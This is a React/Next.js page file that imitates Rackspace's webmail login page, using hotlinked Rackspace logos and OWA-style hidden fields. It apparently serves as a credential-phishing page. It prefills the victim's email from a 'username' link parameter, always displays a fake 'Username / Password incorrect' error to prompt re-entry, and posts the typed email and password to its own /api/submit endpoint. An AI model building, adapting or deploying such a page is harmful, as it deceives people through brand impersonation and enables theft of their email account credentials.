// pages/index.js

"use client";
import { useState, useEffect } from "react";

export default function Home() {
  const [username, setUsername] = useState("");

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const usernameParam = urlParams.get("username");
    if (usernameParam) {
      setUsername(usernameParam);
    }
  }, []);

  const handleSubmit = async (event) => {
    event.preventDefault();

    // Example of handling form submission
    const formData = new FormData(event.target);
    const data = Object.fromEntries(formData.entries());

    const response = await fetch("/api/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });

    if (response.ok) {
      console.log("Form submitted successfully");
    } else {
      console.error("Failed to submit form");
    }
  };

  return (
    <div>
      <div id="content">
        <div>
          <div id="content-header">
            <div id="content-header-logo">
              <img
                id="logo"
                src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"
                alt="Rackspace Technology Logo"
              />
            </div>
            <div id="content-header-label">Webmail Login</div>
          </div>
          <div id="content-body">
            <div id="banner-section">
              <a href="#" target="_blank" rel="noopener noreferrer">
                <img
                  id="banner"
                  src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg"
                  alt="Suspicious Email Banner"
                />
              </a>
            </div>
            <div id="divider"></div>
            <form
              id="form"
              method="post"
              name="login"
              onSubmit={handleSubmit}
              autoComplete="off"
            >
              <div id="form-body">
                <div id="form-container">
                  <div
                    style={{
                      color: "rgb(211, 47, 47)",
                      marginBottom: 20,
                      fontWeight: 500,
                    }}
                  >
                    Username / Password incorrect
                  </div>
                  <input
                    type="hidden"
                    name="__RequestVerificationToken"
                    value="CfDJ8AnTKMtBYOJKuTk_gdGqSQK3mptMrGSmP0f5ktM0gsTVL8GZLQKf58f9cTLrvMyGnSuqET-hXVAHZ8SMT1EJsBKuVCmCoZmtmjx_NDC7_u7UBrZqv-N_zyurbWsynXFOLe1a5Gx83__FjLP4ZFbeLTk"
                  />
                  {/* destination and flags are used for OWA login */}
                  <input
                    id="form-destination"
                    type="hidden"
                    name="destination"
                    value=""
                  />
                  <input
                    id="form-owa-flags"
                    type="hidden"
                    name="flags"
                    value="4"
                  />
                  <div id="user-row" className="row">
                    <div id="user-col" className="col">
                      <div id="user-field" className="form-group">
                        <label id="user-label" className="form-label">
                          Email address
                        </label>
                        <input
                          id="user-input"
                          name="username"
                          tabIndex="1"
                          className="form-field"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                          pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
                          title="Email address"
                          autoComplete="username"
                          required
                        />
                      </div>
                    </div>
                  </div>
                  <div id="pass-row" className="row">
                    <div id="pass-col" className="col">
                      <div id="pass-field" className="form-group">
                        <label id="pass-label" className="form-label">
                          Password
                        </label>
                        <input
                          id="pass-input"
                          name="passwd"
                          tabIndex="2"
                          type="password"
                          className="form-field"
                          pattern=".{4,50}"
                          title="Password"
                          autoComplete="current-password"
                          required
                        />
                      </div>
                      <a id="forgot-password" href="#" tabIndex="4">
                        Forgot password?
                      </a>
                    </div>
                  </div>
                </div>
              </div>
              <div id="login-btn-toolbar">
                <button id="login-btn" tabIndex="3" type="submit">
                  Log In
                </button>
              </div>
            </form>
          </div>
          <div className="base_links">
            <a
              className="base_link"
              target="_blank"
              href="#"
              rel="noopener noreferrer"
            >
              Privacy Statement
            </a>
            <div className="divider"> | </div>
            <a
              className="base_link"
              target="_blank"
              href="#"
              rel="noopener noreferrer"
            >
              Website Terms
            </a>
          </div>
          <div
            className="footer"
            style={{ textAlign: "center", marginTop: 10 }}
          >
            <div className="caption">
              Need webmail for your business? Learn more about
              <a href="#" style={{ color: "#666" }}>
                Hosted Email
              </a>
              from Rackspace
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
